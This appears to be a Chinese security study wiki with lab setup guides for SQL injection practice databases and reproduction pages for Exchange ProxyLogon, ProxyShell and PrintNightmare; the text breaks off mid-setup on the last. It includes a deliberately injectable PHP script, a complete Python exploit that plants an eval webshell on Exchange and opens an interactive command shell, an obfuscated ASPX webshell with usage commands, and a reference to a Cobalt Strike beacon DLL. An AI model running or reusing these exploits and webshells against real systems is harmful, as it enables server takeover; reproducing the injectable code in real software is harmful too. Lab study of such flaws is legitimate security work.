安装包下载和说明简介 ASP+ACCESS带SQL注入网站源码 https://download.csdn.net/download/qq_34266364/10425802?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170480824116777224473336%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fdownload.%2522%257D&amp;request_id=170480824116777224473336&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~download~first_rank_ecpm_v1~rank_v31_ecpm-4-10425802-null-null.269^v2^control&amp;utm_term=access sql注入&amp;spm=1018.2226.3001.4451.5 网站源码 注意看超级小旋风的说明 12342.[]中的名称是您站点的名称，可以任意取名，会显示在菜单最顶部站点列表里4.hostUrl是您的站点域名或IP地址5.listenPort是监听端口 HostUrl默认是localhost，就只能本地访问到，要改成ip，其他主机才能访问到 其他： 之前想弄佛山发发鱼制服有限公司网站源码，没弄成功，没仔细看原因 https://www.youtube.com/watch?v=SdHu1wZsI1U 存错了的，但可能有用https://download.csdn.net/download/weixin_39841856/11284131"},{"title":"PostgreSQL","path":"/wiki/sql_injection_env/PostgreSQL.html","content":"环境搭建 数据库 数据库搭建可以用docker或传统的安装包方式安装 docker传统方式安装 标题 链接 备注 PostgreSQL注入入门 https://macchiato.ink/web/web_security/PostgreSQL_Inject/ docker+phpstudy搭建教程 12docker pull postgres:9.6.20docker run -e POSTGRES_PASSWORD=123456 -p 5432:5432 -d postgres:9.6.20windows上安装postgreSQL 标题 链接 备注 PostgreSQL Server v9.6.20 官方镜像源下载 https://renwole.com/archives/2392 安装包下载 Windows 10平台安装PostgreSQL 14.2详细教程 https://zhuanlan.zhihu.com/p/484450913 安装教程 数据库连接工具：psql命令行连接工具，或PgAdmin 创建相关数据 如用psql命令行连接工具将如下sql脚本导入 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS &quot;public&quot;.&quot;flag&quot;;CREATE TABLE &quot;public&quot;.&quot;flag&quot; ( &quot;flag&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;);INSERT INTO &quot;public&quot;.&quot;flag&quot; VALUES (&#x27;flag&#123;123&#125;&#x27;);DROP TABLE IF EXISTS &quot;public&quot;.&quot;users&quot;;CREATE TABLE &quot;public&quot;.&quot;users&quot; ( &quot;id&quot; int4 NOT NULL, &quot;username&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;, &quot;password&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (1, &#x27;admin&#x27;, &#x27;admin&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (2, &#x27;test&#x27;, &#x27;test&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (3, &#x27;sysadmin&#x27;, &#x27;123456&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (4, &#x27;root&#x27;, &#x27;root&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (5, &#x27;administrator&#x27;, &#x27;administrator&#x27;);ALTER TABLE &quot;public&quot;.&quot;users&quot; ADD CONSTRAINT &quot;users_pkey&quot; PRIMARY KEY (&quot;id&quot;); 方式一：在shell上用qsql导入sql文件方式二：连接数据库后导入1psql -h &lt;ip&gt; -p 5432 -U postgres -W -d postgres -a -f path_to_your_file.sql1psql -h localhost -p 5432 -U postgres -W 当提示输入密码时，输入在运行Docker容器时设置的密码（在这个例子中是123456）。 \\i从文件中执行命令 1\\i &#x27;C:\\\\Users\\\\win10_1809_pro\\\\Desktop\\\\test\\\\postgresql.sql&#x27; 检验 列出所有数据库 1\\l 1\\list 1SELECT * FROM &quot;public&quot;.&quot;users&quot;; php脚本 写一个pgsql.php放在phpstudy的WWW目录下的某个文件夹 123456789101112131415161718192021&lt;?php $host = &quot;host=192.168.147.138&quot;; $port = &quot;port=5432&quot;; $dbname = &quot;dbname=postgres&quot;; $credentials = &quot;user=postgres password=123456&quot;; $db = pg_connect( &quot;$host $port $dbname $credentials&quot; ); $sql =&quot;select * from users where id = &quot;.$_GET[&#x27;id&#x27;]; $ret = pg_query($db, $sql); if(!$ret)&#123; echo pg_last_error($db); exit; &#125; while($row = pg_fetch_row($ret))&#123; echo &quot;username = &quot;. $row[1] .&quot;&lt;/br&gt;&quot;; echo &quot;password = &quot;. $row[2] .&quot;&lt;/br&gt;&quot;; &#125; pg_close($db);?&gt; 访问，然后可以开始练习了 1http://192.168.147.138/postgresql/index.php?id=1"},{"title":"Oracle","path":"/wiki/sql_injection_env/Oracle.html","content":"php连接Oracle数据库 参考：https://blog.csdn.net/qq_35372797/article/details/120791792 看自己用的php版本 123&lt;?phpphpinfo(); ?&gt; 因为要根据php的位数、版本，安装相应的Oracle，然后将Oracle的两个dll拷到php版本的根目录下 一开始我看上面的图以为装Oracle的10和11都可以，然后装了10，试了会提示找不到oci模块 Oracle数据库下载地址https://www.oracle.com/database/technologies/instant-client/downloads.html 我下的Version 10.2.0.5，Instant Client Package - Basic 因为要登录，找别人收集的https://www.jianshu.com/p/e192e251490b 后面看到这个http://pecl.php.net/package/oci8/1.4.10/windows The current OCI8 extension can be linked with Oracle Client libraries from Oracle Database 11.2 or later. (OCI8 3.0 and earlier can be linked with 10g or later). The Oracle Client libraries are in the free Oracle Instant Client from https://www.oracle.com/database/technologies/instant-client.html. They are also included in your database installation. 所以要装Oracle11.2 or later，我下了11.2.0.4.0的压缩包，解压后对instantclient添加环境变量，将里边的两个dll（oci.dll 和 oraooci12.dll (这里也有可能是oraooci11.dll 或其他数字)）拷到php版本的根目录下 修改php.ini，去掉三个注释 如果ext文件夹中缺少dll，要去http://pecl.php.net/package/oci8下载。 重启apache，再次查看phpinfo，搜索oci8，能看到下图 要点 主要还是Oracle的版本要下对，etx文件夹里的dll默认都有的，一般情况下不用在单独下载 Oracle数据库安装 安装包链接https://blog.csdn.net/Keith_LH/article/details/126115278 安装过程https://www.cnblogs.com/lrc123/p/15816083.html 全局数据库名orcl 管理口令Oracle123 scoot/tiger oracle安装过程忘记配置口令管理 启动Oracle服务并启动监听https://blog.csdn.net/cojn52/article/details/115613206 Oracle的连接监听与本地网络配置https://blog.csdn.net/qq_36835560/article/details/96978673 创建数据库https://www.modb.pro/db/38320 全局数据库名orcl1 SYS SYSTEM DBSNMP SYSMAN 管理口令都是：tiger 测试php能否连接Oracle 12345678910&lt;?php$conn = oci_connect(&#x27;用户名&#x27;, &#x27;密码&#x27;, &#x27;远程数据库名(eg.//192.168.1.133/orcl)&#x27;);if (!$conn) &#123; $e = oci_error(); print htmlentities($e[&#x27;message&#x27;]); exit;&#125;else &#123; echo &quot;连接oracle成功！&quot;;&#125;?&gt;"},{"title":"SQLite","path":"/wiki/sql_injection_env/SQLite.html","content":"标题 链接 备注 sqlite-lab，github项目 https://github.com/incredibleindishell/sqlite-lab sqlite-lab部署源码 下载拖进phpstudy的WWW目录下 打开php拓展中的php_sqlite3 其他 可能要用到的软件参考：https://github.com/Tomassky/Web--Training"},{"title":"Exchange CVE-2021-26858/CVE-2021-27065","path":"/wiki/vuln_reproduction/Exchange_CVE-2021-26858_CVE-2021-27065.html","content":"漏洞信息 名称/编号 影响范围 已复现版本 测不通的版本 CVE-2021-26858/CVE-2021-27065 CVE-2021-27065/CVE-2021-26855/CVE-2021-26858：Exchange Server 2019 Cumulative Update 8Exchange Server 2019 Cumulative Update 7Exchange Server 2016 Cumulative Update 19Exchange Server 2016 Cumulative Update 18Exchange Server 2013 Cumulative Update 23 Exchange Server 2016 Cumulative Update 18 Exchange Server 2019 Cumulative Update 9 这是两个CVE配合实现的远程写shell，RCE 漏洞复现 环境拓扑 虚拟机 ip Exchange 2016 cu18 192.168.147.141 攻击机 Exchange环境搭建参考参考链接中的Exchange CVE-2021-26855 RCE漏洞复现或wiki-Windows下的环境搭建-Exchange搭建文章。本次复现是使用server2016搭建DC，然后在该DC上安装Exchange2016，域名是exchange.local 靶机环境要求 安装完，至少需要域/administrator用户登录过https://127.0.0.1/ecp/。 此外，exp会自动fuzz，exp中fuzz_email数组的用户名，用户名@suffix邮箱的信息 复现过程 下载exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240# -*- coding: utf-8 -*-import requestsfrom urllib3.exceptions import InsecureRequestWarningimport randomimport stringimport argparseimport sysrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)fuzz_email = [&#x27;administrator&#x27;, &#x27;webmaste&#x27;, &#x27;support&#x27;, &#x27;sales&#x27;, &#x27;contact&#x27;, &#x27;admin&#x27;, &#x27;test&#x27;, &#x27;test2&#x27;, &#x27;test01&#x27;, &#x27;test1&#x27;, &#x27;guest&#x27;, &#x27;sysadmin&#x27;, &#x27;info&#x27;, &#x27;noreply&#x27;, &#x27;log&#x27;, &#x27;no-reply&#x27;]proxies = &#123;&#125;user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;shell_path = &quot;Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\test11.aspx&quot;shell_absolute_path = &quot;\\\\\\\\127.0.0.1\\\\c$\\\\%s&quot; % shell_path# webshell-马子内容shell_content = &#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;final_shell = &quot;&quot;def id_generator(size=6, chars=string.ascii_lowercase + string.digits): return &#x27;&#x27;.join(random.choice(chars) for _ in range(size))if __name__==&quot;__main__&quot;: parser = argparse.ArgumentParser( description=&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com 如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。&#x27;) parser.add_argument(&#x27;-u&#x27;, type=str, help=&#x27;target&#x27;) parser.add_argument(&#x27;-user&#x27;, help=&#x27;exist email&#x27;, default=&#x27;&#x27;) parser.add_argument(&#x27;-suffix&#x27;, help=&#x27;email suffix&#x27;) args = parser.parse_args() target = args.u suffix = args.suffix if suffix == &quot;&quot;: print(&quot;请输入suffix&quot;) exist_email = args.user if exist_email: fuzz_email.insert(0, exist_email) random_name = id_generator(4) + &quot;.js&quot; print(&quot;目标 Exchange Server: &quot; + target) for i in fuzz_email: new_email = i+suffix autoDiscoverBody = &quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt; &lt;Request&gt; &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt; &lt;/Request&gt;&lt;/Autodiscover&gt;&quot;&quot;&quot; % new_email # print(&quot;get FQDN&quot;) FQDN = &quot;EXCHANGE01&quot; ct = requests.get(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123;&quot;Cookie&quot;: &quot;X-BEResource=localhost~1942062522&quot;, &quot;User-Agent&quot;: user_agent&#125;, verify=False, proxies=proxies) if &quot;X-CalculatedBETarget&quot; in ct.headers and &quot;X-FEServer&quot; in ct.headers: FQDN = ct.headers[&quot;X-FEServer&quot;] print(&quot;got FQDN:&quot; + FQDN) ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;text/xml&quot;, &quot;User-Agent&quot;: user_agent&#125;, data=autoDiscoverBody, proxies=proxies, verify=False ) if ct.status_code != 200: print(ct.status_code) print(&quot;Autodiscover Error!&quot;) if &quot;&lt;LegacyDN&gt;&quot; not in str(ct.content): print(&quot;Can not get LegacyDN!&quot;) try: legacyDn = str(ct.content).split(&quot;&lt;LegacyDN&gt;&quot;)[ 1].split(r&quot;&lt;/LegacyDN&gt;&quot;)[0] print(&quot;Got DN: &quot; + legacyDn) mapi_body = legacyDn + \\ &quot;\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00&quot; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;application/mapi-http&quot;, &quot;X-Requesttype&quot;: &quot;Connect&quot;, &quot;X-Clientinfo&quot;: &quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;, &quot;X-Clientapplication&quot;: &quot;Outlook/15.0.4815.1002&quot;, &quot;X-Requestid&quot;: &quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;, &quot;User-Agent&quot;: user_agent &#125;, data=mapi_body, verify=False, proxies=proxies ) if ct.status_code != 200 or &quot;act as owner of a UserMailbox&quot; not in str(ct.content): print(&quot;Mapi Error!&quot;) exit() sid = str(ct.content).split(&quot;with SID &quot;)[ 1].split(&quot; and MasterAccountSid&quot;)[0] print(&quot;Got SID: &quot; + sid) sid = sid.replace(sid.split(&quot;-&quot;)[-1], &quot;500&quot;) proxyLogon_request = &quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt; &quot;&quot;&quot; % sid ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;text/xml&quot;, &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;User-Agent&quot;: user_agent &#125;, data=proxyLogon_request, proxies=proxies, verify=False ) if ct.status_code != 241 or not &quot;set-cookie&quot; in ct.headers: print(&quot;Proxylogon Error!&quot;) exit() sess_id = ct.headers[&#x27;set-cookie&#x27;].split( &quot;ASP.NET_SessionId=&quot;)[1].split(&quot;;&quot;)[0] msExchEcpCanary = ct.headers[&#x27;set-cookie&#x27;].split(&quot;msExchEcpCanary=&quot;)[ 1].split(&quot;;&quot;)[0] print(&quot;Got session id: &quot; + sess_id) print(&quot;Got canary: &quot; + msExchEcpCanary) ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; # &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( # FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;Cookie&quot;: &quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;. format(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id, msExchEcpCanary=msExchEcpCanary), &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=&#123;&quot;filter&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;OAB&quot;&#125;&#125;, &quot;sort&quot;: &#123;&#125;&#125;, verify=False, proxies=proxies ) if ct.status_code != 200: print(&quot;GetOAB Error!&quot;) exit() oabId = str(ct.content).split(&#x27;&quot;RawIdentity&quot;:&quot;&#x27;)[1].split(&#x27;&quot;&#x27;)[0] print(&quot;Got OAB id: &quot; + oabId) oab_json = &#123;&quot;identity&quot;: &#123;&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: oabId&#125;, &quot;properties&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;ExternalUrl&quot;: &quot;http://ffff/#%s&quot; % shell_content&#125;&#125;&#125; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=oab_json, proxies=proxies, verify=False ) if ct.status_code != 200: print(&quot;Set external url Error!&quot;) exit() reset_oab_body = &#123;&quot;identity&quot;: &#123;&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: oabId&#125;, &quot;properties&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: shell_absolute_path&#125;&#125;&#125; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=reset_oab_body, proxies=proxies, verify=False ) if ct.status_code != 200: print(&quot;写入shell失败&quot;) exit() shell_url = &quot;https://&quot;+target+&quot;/owa/auth/test11.aspx&quot; print(&quot;成功写入shell：&quot; + shell_url) print(&quot;下面验证shell是否ok&quot;) print(&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;) print(&quot;正在请求shell&quot;) import time time.sleep(1) data = requests.post(shell_url, data=&#123; &quot;code&quot;: &quot;Response.Write(new ActiveXObject(\\&quot;WScript.Shell\\&quot;).exec(\\&quot;whoami\\&quot;).StdOut.ReadAll());&quot;&#125;, verify=False, proxies=proxies) if data.status_code != 200: print(&quot;写入shell失败&quot;) else: print(&quot;shell:&quot;+data.text.split(&quot;OAB (Default Web Site)&quot;) [0].replace(&quot;Name : &quot;, &quot;&quot;)) print(&#x27;[+]用户名: &#x27;+ new_email) final_shell = shell_url break except: print(&#x27;[-]用户名: &#x27;+new_email) print(&quot;=============================&quot;) if not final_shell: sys.exit() print(&quot;下面启用交互式shell&quot;) while True: input_cmd = input(&quot;[#] command: &quot;) data=&#123;&quot;code&quot;: &quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot; % input_cmd&#125; ct = requests.post( final_shell, data=data,verify=False, proxies=proxies) if ct.status_code != 200 or &quot;OAB (Default Web Site)&quot; not in ct.text: print(&quot;[*] Failed to execute shell command&quot;) else: shell_response = ct.text.split( &quot;Name :&quot;)[0] print(shell_response) 执行exp exp命令格式123python exp.py -u &lt;靶机ip&gt; -user &lt;用户&gt; -suffix @&lt;FQDN&gt;//suffix：前缀的意思 1python exp.py -u 192.168.147.141 -user administrator -suffix @exchange.local 出错排查 安装完，至少需要域/administrator用户登录过https://127.0.0.1/ecp/ ，否则执行exp会这样： 在Exchange2019cu9上执行exp（估计已修复） 参考链接 参考链接🔗 备注 Exchange CVE-2021-26855 RCE漏洞复现 按这个文章走即可"},{"title":"Exchange ProxyShell","path":"/wiki/vuln_reproduction/Exchange_ProxyShell.html","content":"漏洞信息 名称/编号 影响范围 已复现版本 测不通的版本 ProxyShell Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?) 3个CVE组合成的RCE： CVE-2021-34473 Microsoft Exchange ACL绕过漏洞 CVE-2021-34523 Microsoft Exchange权限提升漏洞 CVE-2021-31207 Microsoft Exchange授权任意文件写入漏洞 漏洞复现 环境拓扑 虚拟机 ip 所在域 Exchange2016cu18 192.168.147.141 exchange.local 这个靶机环境是使用server2016搭建DC，然后在该DC上安装Exchange2016，所在域是exchange.local 虚拟机 ip 所在域 Exchange 2019 cu9 192.168.147.151 exchange2019.local 这个靶机环境是使用server2019搭建DC，然后在该DC上安装Exchange2019，所在域是exchange2019.local 装有python3的攻击机一台 靶机环境要求 exp执行时参数的用户要是Mailbox Import Export角色，可以通过Exchange管理中心（EAC）或通过Exchange管理Shell来添加： 1New-ManagementRoleAssignment -Role &quot;Mailbox Import Export&quot; -User &quot;your user&quot; 例1New-ManagementRoleAssignment –Role &quot;Mailbox Import Export&quot; –User &quot;Administrator&quot; github_proxyshell-poc_issue#4 webshell准备 使用proxyshell_payload对webshell进行Encode 假设想使用这段webshell1&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27; 将上面这段webshell赋值给proxyshell_payload.py中main函数的webshell变量之间，替换后如下： 123456#源码其他部分略if __name__ == &quot;__main__&quot;: webshell = b&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27; #...#源码其他部分略 执行脚本进行Encode 1python proxyshell_payload.py 将Encode webshell部分的内容复制，放到proxyshell_rce.py314行的&lt;t:Content&gt;元素之间 可以根据自己的需求修改生成shell的路径，修改Proxyshell_rce.py中这两行内容，将其对应 对webshell编码的原因ProxyShell的复现与分析Webshell-Attack Exchange PowerShell最后一部分就是在获取了exchange的管理powershell接口之后，如何获取webshell：这里使用的是邮件导出请求New-MailboxExportRequest：12New-MailboxExportRequest –Mailbox orange@orange.local –FilePath\\\\127.0.0.1\\C$\\path\\to\\shell.aspx但是默认导出的格式是pst，并且pst格式会对内容进行加密，直接在邮件中写入webshell并不会生效。orange于是对pst格式进行了研究，去阅读了 MS-PST的文档，发现其使用的加密为类似异或加密模式，也就是说加密在加密就变成了明文，那么只要先使用其加密方法加密一遍我们要写入的webshell，就可以在导出时，获得明文，从而获取webshell。所以要用proxyshell_payload.py先对webshell进行编码然后放到exp的附件中 漏洞利用 exp语法格式1python proxyshell_rce.py -u https://x.x.x.x/ -e administrator@xxx.com（最后这个邮箱必须为目标邮箱管理组的邮箱用户名，一般administrator都在） Exchange2016漏洞利用1python proxyshell_rce.py -u https://192.168.147.141/ -e administrator@exchange.local 执行exp后，获取到的是exchange的powershell管理shell，然后清理邮件导出请求，之后执行dropshell，即可写入webshell 12Get-MailboxExportRequestGet-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false dropshell写webshell 1dropshell 在C:\\inetpub\\wwwroot\\aspnet_client下看到写的webshell 成功后使用蚁剑连接webshell，连接地址为终端回显的webshell-url地址，密码为mima，勾选忽略HTTPS证书 连接成功，终端回显权限为system troubleshooting 靶机注意关闭杀软，要不写shell可能被杀 Exchange2019复现问题 Exchange2019漏洞利用1python proxyshell_rce.py -u https://192.168.147.151/ -e Administrator@exchange2019.local 到dropshell步骤前都正常 然后执行dropshell有概率failed，不清楚原因。但如果先用这版的proxyshell工具先dropshell（能写入webshell，俺将上边webshell的Encode放入t.Conent之间，写webshell，但是蚁剑连接提示数据为空），后面用proxyshell_rce.py就百分百能写webshell。 依赖1pip install tldextract 123python exchange_proxyshell_raw.py -u https://192.168.147.151dropshell 利用步骤学习 参考这篇文章Exchange ProxyShell复现_exchange shell-CSDN博客，远程写webshell是通过发邮件，webshell在附件中，然后解压到本地。 参考链接 参考链接🔗 备注 Exchange CVE-2021-34473 RCE复现 复现参考文章之一 ProxyShell的复现与分析 复现参考文章之一 Exchange CVE-2021-34473 复现参考文章之一，很详细，webshell现成可用 proxyshell_payload 对webshell Encode成ProxyShell的payload proxyshell-poc exp利用 其他版的ProxyShell 参考链接🔗 备注 CVE-2021-34473-Exchange-ProxyShell 步骤拆分版 步骤拆分版： token 发邮件 getshell 2019试了getshell不行 命令记录1234567891011121314152016： 单个获取tokenpython send_webshell_mail.py https://192.168.147.141 administrator@exchange.local (只发送webshell 草稿邮件)python send_webshell_mail.py https://192.168.147.141 administrator@exchange.local sendpython wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBxhZG1pbmlzdHJhdG9yQGV4Y2hhbmdlLmxvY2FsVS1TLTEtNS0yMS0yODA0NDc5NzgxLTM3MzM1MzQ0MDktMjQ0NjY5OTQwNC01MDBHAQAAAAcAAAAMUy0xLTUtMzItNTQ0RQAAAAA= shell2019： 单个获取tokenpython send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local (只发送webshell 草稿邮件)python send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local sendpython wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTCBBZG1pbmlzdHJhdG9yQGV4Y2hhbmdlMjAxOS5sb2NhbFUrUy0xLTUtMjEtNzkzNTEwODE1LTcxOTY4NTQxMC0zNDU1NTgzNjg3LTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA== shell 参考链接🔗 备注 ProxyShell 一键利用版 https://codeantenna.com/a/JMadcrhX0j 参考文章 Exchange ProxyShell复现_exchange shell-CSDN博客 参考文章 ProxyShell 上一篇博客博主打包的工具 2016有时ok,whoami回显sysytem，2019失败："},{"title":"PrintNightmare CVE-2021-1675/CVE-2021-34527","path":"/wiki/vuln_reproduction/PrintNightmare.html","content":"漏洞信息 名称/编号 影响范围 已复现版本 测不通的版本 PrintNightmare Windows 7Windows 8.1Windows 10Windows Server 2008 R2Windows Server 2012Windows Server 2016Windows Server 2019 server2019作为DC域里用户win7，server2016，win10均复现 server2012作为DC能复现加载本地的dll，SMB会rpc_s_access_denied 两个相似的洞，但微软披露的漏洞信息的vector（向量）不一样，一个lpe，一个是rce。本文复现的是rce，exp脚本是作者写为了CVE 2021-1675 CVE-2021-1675：LPE CVE-2021-34527：RCE 漏洞复现 环境拓扑 虚拟机 ip 版本 备注 域控DC，server2019 192.168.147.137 Version 1809(Os Build 17763.107) server2012当DC，exp打DC或这个域中其他成员都报rpc access denied。具体原因未知 域成员server2016 192.168.147.138 版本1607(OS内部版本14393.447) 域成员win10 192.168.147.140 版本1909 (oS内部版本18363.418) 域成员win7 192.168.147.139 Version 6.1(Build 7601: Service Pack 1) 攻击机kali 192.168.147.128 漏洞检测 作者的exp(CVE-2021-1675)依赖于作者修改过的impacket，因此需要先安装作者修改过的impacket。 1234pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install impacket/example里的rpcdump.py可用于检测potential vulnerable hosts。 1python3 rpcdump.py @192.168.147.136 | egrep &#x27;MS-RPRN|MS-PAR&#x27; 如果回显如下，说明目标是vulnerable 12Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol 创建匿名SMB共享 准备一个malicious dll，因为spoolsv.exe是x64的，所以这个dll也要是x64的。在本例中是cs生成的windows stageless x64dll，名为beacon.dll 匿名SMB共享可以是windows或Linux主机来起 WindowsLinux如在域成员server2016主机中 管理员cmd 1mkdir C:\\share 